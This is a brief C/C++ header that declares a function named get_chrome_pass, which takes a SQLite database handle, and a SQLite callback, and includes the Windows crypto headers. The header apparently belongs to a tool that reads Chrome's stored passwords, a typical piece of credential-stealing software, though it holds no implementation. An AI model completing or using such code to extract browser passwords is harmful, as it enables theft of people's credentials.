#ifndef WIN_TOOLS
#define WIN_TOOLS

#include <windows.h>
#include <Wincrypt.h>
#include <tchar.h>
#include <sstream>
#include "../sqlite3.h"

std::stringstream get_chrome_pass(sqlite3* db);
int callback1(void *NotUsed, int argc, char **argv, char **azColName);

#endif